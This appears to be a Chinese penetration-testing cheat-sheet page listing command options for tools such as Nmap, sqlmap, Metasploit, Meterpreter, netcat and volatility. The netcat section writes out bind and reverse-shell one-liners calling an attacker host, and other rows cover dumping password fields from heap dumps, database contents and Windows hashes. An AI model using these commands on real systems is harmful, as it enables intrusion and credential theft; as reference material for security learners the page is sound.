<!DOCTYPE html>
<html>
<head>
	<title>安全图谱</title>
	<meta charset="utf-8">

	<!-- 引入配置文件 -->
	
<link rel="stylesheet" href="/SafetyAtlas/css/main.css">


	<!-- 字体图片库 -->
	
<link rel="stylesheet" href="/SafetyAtlas/lib/font-awesome/css/font-awesome.min.css">


	<!-- 代码高亮库 -->
	
<link rel="stylesheet" href="/SafetyAtlas/lib/highlight/styles/atom-one-dark.css">

	
<meta name="generator" content="Hexo 6.3.0"></head>
<body>

	<div id="main">
		<!-- 引入侧边栏 -->
		<aside>
			<!-- 搜索栏 -->
<div id="search">
	<input class="search-input" type="text" placeholder="search">
	<i id="search-icon" class="fa fa-bars" title="切换目录与索引">
</div>

<!-- 侧边目录栏 -->
<div id="tree">
	

	
					<ul>
						<li class="directory">
							<a href="#" class="directory">
								<i class="fa fa-folder"></i>
								安全学习
							</a>
							
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/安全学习/CTF/">
								<i class="fa fa-file"></i>
								CTF
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/安全学习/书籍/">
								<i class="fa fa-file"></i>
								书籍
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/安全学习/公众号/">
								<i class="fa fa-file"></i>
								公众号
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/安全学习/博客/">
								<i class="fa fa-file"></i>
								博客
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/安全学习/名词/">
								<i class="fa fa-file"></i>
								名词
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/安全学习/文库/">
								<i class="fa fa-file"></i>
								文库
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/安全学习/星球/">
								<i class="fa fa-file"></i>
								星球
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/安全学习/论坛/">
								<i class="fa fa-file"></i>
								论坛
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/安全学习/靶场/">
								<i class="fa fa-file"></i>
								靶场
							</a>
						</li>
					</ul>
	
						</li>
						
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/应急响应/">
								<i class="fa fa-file"></i>
								应急响应
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="directory">
							<a href="#" class="directory">
								<i class="fa fa-folder"></i>
								渗透手册
							</a>
							
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透手册/CDN/">
								<i class="fa fa-file"></i>
								CDN
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透手册/SRC/">
								<i class="fa fa-file"></i>
								SRC
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透手册/云服务器/">
								<i class="fa fa-file"></i>
								云服务器
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透手册/厂商/">
								<i class="fa fa-file"></i>
								厂商
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file active">
							<a href="/SafetyAtlas/渗透手册/命令/">
								<i class="fa fa-file"></i>
								命令
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透手册/导航/">
								<i class="fa fa-file"></i>
								导航
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透手册/快捷键/">
								<i class="fa fa-file"></i>
								快捷键
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透手册/端口/">
								<i class="fa fa-file"></i>
								端口
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透手册/路径/">
								<i class="fa fa-file"></i>
								路径
							</a>
						</li>
					</ul>
	
						</li>
						
					</ul>
	
					<ul>
						<li class="directory">
							<a href="#" class="directory">
								<i class="fa fa-folder"></i>
								渗透测试
							</a>
							
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透测试/代码审计/">
								<i class="fa fa-file"></i>
								代码审计
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透测试/信息收集/">
								<i class="fa fa-file"></i>
								信息收集
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透测试/内网渗透/">
								<i class="fa fa-file"></i>
								内网渗透
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透测试/后门连接/">
								<i class="fa fa-file"></i>
								后门连接
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透测试/抓包嗅探/">
								<i class="fa fa-file"></i>
								抓包嗅探
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透测试/插件工具/">
								<i class="fa fa-file"></i>
								插件工具
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透测试/漏洞利用/">
								<i class="fa fa-file"></i>
								漏洞利用
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透测试/社工爆破/">
								<i class="fa fa-file"></i>
								社工爆破
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透测试/编码解码/">
								<i class="fa fa-file"></i>
								编码解码
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透测试/辅助工具/">
								<i class="fa fa-file"></i>
								辅助工具
							</a>
						</li>
					</ul>
	
					<ul>
						<li class="file">
							<a href="/SafetyAtlas/渗透测试/逆向分析/">
								<i class="fa fa-file"></i>
								逆向分析
							</a>
						</li>
					</ul>
	
						</li>
						
					</ul>
	
</div>


<!-- 最尾部添加，这里就不列以前的代码了 -->
<div id="toc" style="display: none;"></div>

		</aside>

		<!-- 引入导航 -->
		<nav>
			<ul id="menu">
	
	
    <li class="menu-item">
        <a href="/" class="menu-item-link">主页</a>
    </li>
    
    <li class="menu-item">
        <a href="/SafetyAtlas/about" class="menu-item-link">关于</a>
    </li>
    

    
    
    <li class="menu-item">
        <a href="https://github.com/smallfox233/SafetyAtlas" class="menu-item-link" target="_blank">github</a>
    </li>
    

</ul>

		</nav>

		<!-- 引入正文 -->
		<div id="content">
			<div>
	<span id="post-author">小狐狸FM</span>
	<span id="post-date">2023-02-27 00:00:00</span>
</div>

<div id="article">
	<p>在windows中，**-<strong>也可写作</strong>&#x2F;**</p>
<p>windows大小写不敏感，linux大小写敏感</p>
<h1 id="工具命令"><a href="#工具命令" class="headerlink" title="工具命令"></a>工具命令</h1><h2 id="Composer"><a href="#Composer" class="headerlink" title="Composer"></a>Composer</h2><p><strong>下载方式一：</strong></p>
<p>访问下方链接可下载php安装文件</p>
<p>将php.exe添加至系统环境变量</p>
<p>通过php.exe运行该文件后可下载composer.phar（不推荐）</p>
<p><a target="_blank" rel="noopener" href="https://install.phpcomposer.com/installer">https://install.phpcomposer.com/installer</a></p>
<p><strong>下载方式二：</strong></p>
<p>访问下方链接下载composer</p>
<p>将php.exe添加至系统环境变量</p>
<p>通过php.exe composer.phar来执行（推荐）</p>
<p><a target="_blank" rel="noopener" href="https://install.phpcomposer.com/composer.phar">https://install.phpcomposer.com/composer.phar</a></p>
<table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>安装thinkphp</td>
<td>composer create-project topthink&#x2F;think:5.0.22 tp</td>
<td>安装5.0.22版本，并在生成tp文件夹用于保存thinkphp源码</td>
</tr>
</tbody></table>
<h2 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h2><table>
<thead>
<tr>
<th>作用</th>
<th align="left">参数</th>
<th>示例</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>指定URL</td>
<td align="left">-u</td>
<td>-u <a target="_blank" rel="noopener" href="https://www.baidu.com/">https://www.baidu.com</a></td>
<td></td>
</tr>
<tr>
<td>指定线程,默认30</td>
<td align="left">-t 数字</td>
<td>-t 10</td>
<td></td>
</tr>
<tr>
<td>指定状态码</td>
<td align="left">-i 范围A-范围B</td>
<td>-i 200-399</td>
<td>匹配200-399之间的状态码</td>
</tr>
<tr>
<td>指定文件类型</td>
<td align="left">-e 后缀A,后缀B..</td>
<td>-e php,html</td>
<td>匹配文件类型php和html</td>
</tr>
</tbody></table>
<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><table>
<thead>
<tr>
<th>作用</th>
<th>参数</th>
<th>示例</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>更新配置</td>
<td></td>
<td>systemctl daemon-reload</td>
<td></td>
</tr>
<tr>
<td>重启docker</td>
<td></td>
<td>systemctl restart docker</td>
<td></td>
</tr>
<tr>
<td>查看镜像信息</td>
<td>ps -a</td>
<td>docker ps -a</td>
<td></td>
</tr>
<tr>
<td>根据CONTAINER ID进入镜像</td>
<td>exec -it 编号 shell路径</td>
<td>docker exec -it at12 &#x2F;bin&#x2F;bash</td>
<td>进入编号为at12的镜像<br>编号可以只填写前半部分</td>
</tr>
<tr>
<td>关闭镜像</td>
<td>stop 编号</td>
<td>docker stop 编号</td>
<td></td>
</tr>
<tr>
<td>删除镜像</td>
<td>rm 编号</td>
<td>docker rm 编号</td>
<td></td>
</tr>
</tbody></table>
<h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><table>
<thead>
<tr>
<th>作用</th>
<th>参数</th>
<th>示例</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>将整个项目添加至暂存区</td>
<td>add .</td>
<td>git add .</td>
<td></td>
</tr>
<tr>
<td>将文件添加至暂存区</td>
<td>add 文件名</td>
<td>git add 文件名</td>
<td></td>
</tr>
<tr>
<td>查看本地分支</td>
<td>branch</td>
<td>git branch</td>
<td></td>
</tr>
<tr>
<td>查看远程分支</td>
<td>branch -a</td>
<td>git branch -a</td>
<td></td>
</tr>
<tr>
<td>切换分支</td>
<td>check -b 分支名</td>
<td></td>
<td></td>
</tr>
<tr>
<td>查看当前配置</td>
<td>config –list</td>
<td>git config –list</td>
<td></td>
</tr>
<tr>
<td>设置用户名</td>
<td></td>
<td>git config –global user.name ‘用户名’</td>
<td></td>
</tr>
<tr>
<td>设置邮箱</td>
<td></td>
<td>git config –global user.email ‘邮箱’</td>
<td></td>
</tr>
<tr>
<td>本地初始化仓库</td>
<td>init</td>
<td>git init</td>
<td></td>
</tr>
<tr>
<td>将本地仓库与远程仓库关联</td>
<td></td>
<td>git remote add origin 仓库链接</td>
<td></td>
</tr>
<tr>
<td>将本地项目推送到远程仓库</td>
<td></td>
<td>git push -u origin master</td>
<td></td>
</tr>
<tr>
<td>查看本地仓库状态</td>
<td>status</td>
<td>git status</td>
<td></td>
</tr>
<tr>
<td>生成ssh公私钥</td>
<td></td>
<td>ssh-keygen -t rsa -C 邮箱</td>
<td></td>
</tr>
</tbody></table>
<h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2><table>
<thead>
<tr>
<th>作用</th>
<th>参数</th>
<th>示例</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>初始化</td>
<td>init</td>
<td>hexo init</td>
<td></td>
</tr>
<tr>
<td>清除缓存</td>
<td>clean</td>
<td>hexo clean</td>
<td></td>
</tr>
<tr>
<td>启用</td>
<td>s</td>
<td>hexo s</td>
<td></td>
</tr>
<tr>
<td>生成静态文件并部署到特定仓库</td>
<td>d</td>
<td>hexo d</td>
<td></td>
</tr>
<tr>
<td>生成静态文件并部署到特定仓库</td>
<td>deploy</td>
<td>hexo deploy</td>
<td></td>
</tr>
<tr>
<td>生成静态文件</td>
<td>g</td>
<td>hexo</td>
<td></td>
</tr>
<tr>
<td>生成静态文件</td>
<td>generage</td>
<td>hexo generage</td>
<td></td>
</tr>
<tr>
<td>创建md文件</td>
<td>new post 文件路径</td>
<td>hexo new post test</td>
<td>在_post文件夹中创建test.md文件</td>
</tr>
<tr>
<td>创建md文件</td>
<td>new post –path “目录&#x2F;文件名”</td>
<td>hexo new post –path “test&#x2F;1”</td>
<td>在_post&#x2F;test文件夹中创建1.md文件</td>
</tr>
</tbody></table>
<h2 id="Jhat"><a href="#Jhat" class="headerlink" title="Jhat"></a>Jhat</h2><p>OQL命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">select filter(map(</span><br><span class="line">map(filter(heap.classes(), function(it) &#123;</span><br><span class="line">var interests = /passw/;</span><br><span class="line"></span><br><span class="line">for(field in it.fields)</span><br><span class="line">if(interests.test(it.fields[field].name.toLowerCase())) return true;</span><br><span class="line"></span><br><span class="line">return false;</span><br><span class="line">&#125;), &quot;heap.objects(it, true)&quot;), function(it) &#123;</span><br><span class="line">var res = &quot;&quot;;</span><br><span class="line">var interests = /passw/;</span><br><span class="line"></span><br><span class="line">while (it.hasMoreElements()) &#123;</span><br><span class="line">it = it.nextElement();</span><br><span class="line">for(field in it) &#123;</span><br><span class="line">if(interests.test(field.toLowerCase())) &#123;</span><br><span class="line">if(res !== &#x27;&#x27;)</span><br><span class="line">res += &#x27;, &#x27;;</span><br><span class="line">res += field + &#x27; : &#x27; + (it[field] ? (it[field].value ?</span><br><span class="line">it[field].value.toString() : it[field].toString()) : it[field]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return res;</span><br><span class="line">&#125;), &quot;it&quot;);</span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th>作用</th>
<th>参数</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>读取heapdump</td>
<td>jhat -port 端口 -J-Xmx4G 文件路径</td>
<td>访问127.0.0.1:7401输入OQL代码执行</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><table>
<thead>
<tr>
<th>作用</th>
<th>参数</th>
<th>示例</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>搜索符合条件的模块</td>
<td>search 匹配条件</td>
<td></td>
<td></td>
</tr>
<tr>
<td>选择指定模块</td>
<td>use 模块名</td>
<td></td>
<td></td>
</tr>
<tr>
<td>显示配置项信息</td>
<td>show options</td>
<td></td>
<td></td>
</tr>
<tr>
<td>显示相关模块信息</td>
<td>info</td>
<td></td>
<td></td>
</tr>
<tr>
<td>设置配置项</td>
<td>set 参数 值</td>
<td></td>
<td></td>
</tr>
<tr>
<td>启用模块</td>
<td>run</td>
<td></td>
<td></td>
</tr>
<tr>
<td>启动渗透模块</td>
<td>exploit</td>
<td></td>
<td></td>
</tr>
<tr>
<td>检测目标是否易受攻击</td>
<td>check</td>
<td></td>
<td></td>
</tr>
<tr>
<td>列出可用会话</td>
<td>sessions</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p>Meterpreter是一种使用内存技术的攻击载荷，可以注入到进程之中</p>
<p>提供了各种可以在目标上执行的功能</p>
<table>
<thead>
<tr>
<th>作用</th>
<th>参数</th>
<th>示例</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>列出渗透主机的系统信息</td>
<td>sysinfo</td>
<td></td>
<td></td>
</tr>
<tr>
<td>列出渗透主机的网络接口</td>
<td>ifconfig</td>
<td></td>
<td></td>
</tr>
<tr>
<td>列出目标主机ARP缓存地址</td>
<td>arp</td>
<td></td>
<td></td>
</tr>
<tr>
<td>将一个处于激活状态的会话发送到后台</td>
<td>background</td>
<td></td>
<td></td>
</tr>
<tr>
<td>获取目标主机的一个cmdshell</td>
<td>shell</td>
<td></td>
<td></td>
</tr>
<tr>
<td>获取当前用户信息</td>
<td>getuid</td>
<td></td>
<td></td>
</tr>
<tr>
<td>提权，获取系统权限</td>
<td>getsystem</td>
<td></td>
<td></td>
</tr>
<tr>
<td>获取Meterpreter会话在目标主机上<br>注入进程的进程号</td>
<td>getpid</td>
<td></td>
<td></td>
</tr>
<tr>
<td>列出目标主机上运行的所有进程</td>
<td>ps</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h2><table>
<thead>
<tr>
<th>名称</th>
<th>作用</th>
<th>参数</th>
<th>示例</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>nc</td>
<td>详细输出</td>
<td>-v</td>
<td></td>
<td></td>
</tr>
<tr>
<td>nc</td>
<td>更详细输出</td>
<td>-vv</td>
<td></td>
<td></td>
</tr>
<tr>
<td>nc</td>
<td>绑定命令行</td>
<td>-e</td>
<td></td>
<td></td>
</tr>
<tr>
<td>nc</td>
<td>断开后强制保持连接<br>并继续监听端口</td>
<td>-k</td>
<td></td>
<td></td>
</tr>
<tr>
<td>nc</td>
<td>不使用DNS反查IP</td>
<td>-n</td>
<td></td>
<td></td>
</tr>
<tr>
<td>nc</td>
<td>扫描时不发送任何数据包</td>
<td>-z</td>
<td></td>
<td></td>
</tr>
<tr>
<td>nc</td>
<td>监听端口</td>
<td>-l 端口</td>
<td>-l 8888</td>
<td>监听8888端口</td>
</tr>
<tr>
<td>nc</td>
<td>监听本地端口</td>
<td>-p 端口</td>
<td>-p 9999</td>
<td>监听9999端口</td>
</tr>
<tr>
<td>nc</td>
<td>正向反弹shell</td>
<td></td>
<td>nc -lvvp 端口 -e &#x2F;bin&#x2F;bash<br>nc 目标IP 端口</td>
<td>Linux受控主机执行<br>攻击机执行</td>
</tr>
<tr>
<td>nc</td>
<td>反向反弹shell</td>
<td></td>
<td>nc -lvvp 端口<br>&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;攻击机&#x2F;端口 0&lt;&amp;1 2&gt;&amp;1</td>
<td>攻击机需先监听<br>Linux受控主机执行</td>
</tr>
</tbody></table>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><table>
<thead>
<tr>
<th>作用</th>
<th>参数</th>
<th>示例</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>边扫描边输出</td>
<td>-v</td>
<td></td>
<td></td>
</tr>
<tr>
<td>路由跟踪</td>
<td>-traceroute</td>
<td></td>
<td></td>
</tr>
<tr>
<td>设置时间参数</td>
<td>-T数字</td>
<td>nmap -T4 目标</td>
<td>-T0 用于躲避IDS，时间很长<br>-T1 用于躲避IDS，时间很长<br>-T2 降低扫描速度，使用更小的带宽和资源对目标扫描<br>-T3 默认模式<br>-T4 假设用户具有合适可靠的网络<br>-T5 假设用户有更好的网络或牺牲准确性对目标扫描</td>
</tr>
<tr>
<td>版本识别</td>
<td>-sV</td>
<td></td>
<td>扫描端口同时检测对应服务版本</td>
</tr>
<tr>
<td>UDP扫描</td>
<td>-sU</td>
<td></td>
<td>扫描UDP端口</td>
</tr>
<tr>
<td>TCP扫描</td>
<td>-sT</td>
<td></td>
<td>完成三次握手，只适用于找出TCP和UDP端口</td>
</tr>
<tr>
<td>SYN扫描</td>
<td>-sS</td>
<td></td>
<td>绕设备</td>
</tr>
<tr>
<td>ping扫描<br>检测存活IP</td>
<td>-sP 网段</td>
<td>nmap -sP 192.168.1.0&#x2F;24</td>
<td>检测C段的主机存活</td>
</tr>
<tr>
<td>ping扫描</td>
<td>-sn</td>
<td>nmap -sn 10.0.1.0&#x2F;24</td>
<td></td>
</tr>
<tr>
<td>FIN扫描</td>
<td>-sF</td>
<td></td>
<td>检测防火墙状态，识别端口状态</td>
</tr>
<tr>
<td>检测TLS版本</td>
<td><code>--script=ssl-enum-ciphers</code></td>
<td><code>nmap -p 端口 --script=ssl-enum-ciphers 目标</code></td>
<td>通常有TLS的目标都是用的https协议</td>
</tr>
<tr>
<td>根据端口的服务自动调用脚本</td>
<td>-sC</td>
<td></td>
<td></td>
</tr>
<tr>
<td>禁止ping扫描</td>
<td>-Pn</td>
<td></td>
<td>绕设备</td>
</tr>
<tr>
<td>指定端口</td>
<td>-p 端口范围</td>
<td>nmap -p 1-65535 目标</td>
<td>扫描目标的1-65535端口<br>不指定端口时，为默认的1000个端口！！</td>
</tr>
<tr>
<td>扫描全端口</td>
<td>-p -</td>
<td></td>
<td></td>
</tr>
<tr>
<td>猜测目标系统版本</td>
<td>-O –osscan-guess</td>
<td></td>
<td></td>
</tr>
<tr>
<td>检测目标系统类型</td>
<td>-O</td>
<td></td>
<td></td>
</tr>
<tr>
<td>输出到xml</td>
<td>-oX 名称.xml</td>
<td></td>
<td></td>
</tr>
<tr>
<td>输出到文本</td>
<td>-oS 名称.txt</td>
<td></td>
<td>将输出写成特殊符号的形式<br>内容和-oN一样，字体发生变化</td>
</tr>
<tr>
<td>输出到文本</td>
<td>-oN 名称.txt</td>
<td></td>
<td></td>
</tr>
<tr>
<td>输出所有格式到文件</td>
<td>-oA</td>
<td></td>
<td>xml、.gnmap和.nmap格式</td>
</tr>
<tr>
<td>设置发包最大传输单元</td>
<td>-mtu 大小</td>
<td></td>
<td>绕设备<br>大小必须为8的倍数，且为正数</td>
</tr>
<tr>
<td>扫描文件中的IP</td>
<td>-iL 文件</td>
<td></td>
<td></td>
</tr>
<tr>
<td>综合扫描</td>
<td>-A</td>
<td></td>
<td>ping扫描1-10000中的1000个端口<br>操作系统、脚本、路由跟踪、服务探测</td>
</tr>
</tbody></table>
<h2 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h2><table>
<thead>
<tr>
<th>作用</th>
<th>参数</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>安装deploy-git</td>
<td>npm install hexo-deployer-git –save</td>
<td></td>
</tr>
<tr>
<td>安装图片插件</td>
<td>npm install hexo-asset-image –save</td>
<td></td>
</tr>
<tr>
<td>安装shuji</td>
<td>npm install –global shuji</td>
<td></td>
</tr>
<tr>
<td>安装reverse-sourcemap</td>
<td>npm install –global reverse-sourcemap</td>
<td></td>
</tr>
</tbody></table>
<h2 id="pyinstaller"><a href="#pyinstaller" class="headerlink" title="pyinstaller"></a>pyinstaller</h2><p>python的第三方库</p>
<table>
<thead>
<tr>
<th>作用</th>
<th>参数</th>
<th>示例</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>隐藏运行窗口</td>
<td>-W</td>
<td></td>
<td></td>
</tr>
<tr>
<td>创建spec文件用于打包项目</td>
<td>pyi-makespec</td>
<td>pyi-makespec main.py</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="Redis-cli"><a href="#Redis-cli" class="headerlink" title="Redis-cli"></a>Redis-cli</h2><table>
<thead>
<tr>
<th>作用</th>
<th>参数</th>
<th>示例</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>指定端口</td>
<td>-p 端口</td>
<td></td>
<td>redis常见端口为6379</td>
</tr>
<tr>
<td>指定主机</td>
<td>-h 目标</td>
<td></td>
<td>这里的h是表示的hostname</td>
</tr>
<tr>
<td>指定密码</td>
<td>-a 密码</td>
<td></td>
<td>估计是p被用掉了，只能用password的第二个字母</td>
</tr>
</tbody></table>
<h2 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h2><table>
<thead>
<tr>
<th>作用</th>
<th>参数</th>
<th>示例</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>检测get类型漏洞</td>
<td>-u URL</td>
<td></td>
<td></td>
</tr>
<tr>
<td>检测post类型漏洞</td>
<td>-r 文本路径</td>
<td></td>
<td>需要先使用抓包工具，获取请求报文后将内容写入文本，如果需要指定位置检测，可使用*</td>
</tr>
<tr>
<td>设置自动选择</td>
<td>–batch</td>
<td></td>
<td></td>
</tr>
<tr>
<td>检测数据库类型</td>
<td>-b</td>
<td></td>
<td></td>
</tr>
<tr>
<td>指定参数检测</td>
<td>-p 参数名</td>
<td></td>
<td></td>
</tr>
<tr>
<td>设置数据库类型</td>
<td>–dbms 类型</td>
<td></td>
<td></td>
</tr>
<tr>
<td>查询当前库名</td>
<td>–current-db</td>
<td></td>
<td></td>
</tr>
<tr>
<td>检测是否为管理员权限</td>
<td>–is-dba</td>
<td></td>
<td></td>
</tr>
<tr>
<td>设置DNS</td>
<td>–dns-domain</td>
<td></td>
<td></td>
</tr>
<tr>
<td>设置随机的user-agent字段</td>
<td>–random-agent</td>
<td></td>
<td></td>
</tr>
<tr>
<td>开启sql命令行</td>
<td>–os-shell</td>
<td></td>
<td>需要DBA权限，并且知晓目标的WEB路径</td>
</tr>
<tr>
<td>查询库名</td>
<td>–dbs</td>
<td></td>
<td></td>
</tr>
<tr>
<td>根据库名查表名</td>
<td>-D 库名 –tables</td>
<td></td>
<td></td>
</tr>
<tr>
<td>根据库名表名查询字段名</td>
<td>-D 库名 -T 表名 –columns</td>
<td></td>
<td></td>
</tr>
<tr>
<td>根据库名表名字段名查询数据</td>
<td>-D 库名 -T 表名 -C 字段名 –dump</td>
<td></td>
<td></td>
</tr>
<tr>
<td>流量代理</td>
<td>-proxy&#x3D;<a href="http://IP:端口">http://IP:端口</a></td>
<td></td>
<td>如果需要将流量转发到burp时，可以使用该参数</td>
</tr>
</tbody></table>
<h2 id="volatility"><a href="#volatility" class="headerlink" title="volatility"></a>volatility</h2><p>以下均为volatility2版本的命令</p>
<table>
<thead>
<tr>
<th>作用</th>
<th>参数</th>
<th>示例</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>指定内存</td>
<td>-f</td>
<td>vol2.py -f xxx.raw</td>
<td></td>
</tr>
<tr>
<td>查询内存信息</td>
<td>imageinfo</td>
<td>vol2.py -f xxx.raw imageinfo</td>
<td></td>
</tr>
<tr>
<td>指定系统类型</td>
<td>–profile</td>
<td>vol2.py -f xxx.raw –profile&#x3D;Win7SP1x64</td>
<td>可通过imageinfo查询可使用的profile值</td>
</tr>
<tr>
<td>查询用户名</td>
<td><code>printkey   -K  &quot;SAM\Domains\Account\Users\Names&quot;</code></td>
<td><strong>vol2.py -f xxx.raw printkey   -K  “SAM\Domains\Account\Users\Names”</strong></td>
<td>针对windows</td>
</tr>
<tr>
<td>查询hashdump</td>
<td>hashdump</td>
<td>vol2.py -f xxx.raw –profile&#x3D;Win7SP1x64 hashdump</td>
<td></td>
</tr>
<tr>
<td>查询密码</td>
<td>lsadump</td>
<td>vol2.py -f xxx.raw –profile&#x3D;Win7SP1x64 lsadump</td>
<td>通过lsass.exe进程dump密码</td>
</tr>
<tr>
<td>查询cmd命令情况</td>
<td>cmdline</td>
<td>vol2.py -f xxx.raw –profile&#x3D;Win7SP1x64 cmdline</td>
<td></td>
</tr>
<tr>
<td>查看网络连接</td>
<td>netscan</td>
<td>vol2.py -f xxx.raw –profile&#x3D;Win7SP1x64 netscan</td>
<td></td>
</tr>
<tr>
<td>导出文件</td>
<td>dumpfiles -Q 虚拟地址 -D 保存位置</td>
<td>vol2.py -f xxx.raw –profile&#x3D;Win7SP1x64 -Q 0x000000007f142f20 -D “D:&#x2F;123”</td>
<td>可通过filescan查询虚拟地址</td>
</tr>
<tr>
<td>查询文件信息</td>
<td>filescan</td>
<td>vol2.py -f xxx.raw –profile&#x3D;Win7SP1x64 filescan</td>
<td></td>
</tr>
<tr>
<td>查询缓存注册表</td>
<td>hivelist</td>
<td>vol2.py -f xxx.raw –profile&#x3D;Win7SP1x64 hivelist</td>
<td></td>
</tr>
<tr>
<td>查询进程</td>
<td>pslist</td>
<td>vol2.py -f xxx.raw –profile&#x3D;Win7SP1x64 pslist</td>
<td></td>
</tr>
</tbody></table>
<h2 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h2><table>
<thead>
<tr>
<th>作用</th>
<th>参数</th>
<th>示例</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>生成证书</td>
<td>genca</td>
<td></td>
<td></td>
</tr>
<tr>
<td>被动扫描</td>
<td>webscan –listen 127.0.0.1:端口 –html-output 名称.html</td>
<td></td>
<td>如果输出的文件已存在，则无法扫描</td>
</tr>
<tr>
<td>爬虫模式扫描</td>
<td>webscan –basic-crawler 目标 –html-output 名称.html</td>
<td></td>
<td>如果输出的文件已存在，则无法扫描</td>
</tr>
<tr>
<td>从url列表中批量扫描</td>
<td><code>webscan --uf url.txt --ho result__datetime__.html</code></td>
<td></td>
<td></td>
</tr>
<tr>
<td>从burp导出的文件中扫描</td>
<td><code>webscan --bf burp.txt --ho result__datetime__.html</code></td>
<td></td>
<td></td>
</tr>
<tr>
<td>从requests请求包中扫描</td>
<td><code>webscan --rr req.txt --ho result__datetime__.html</code></td>
<td></td>
<td></td>
</tr>
</tbody></table>
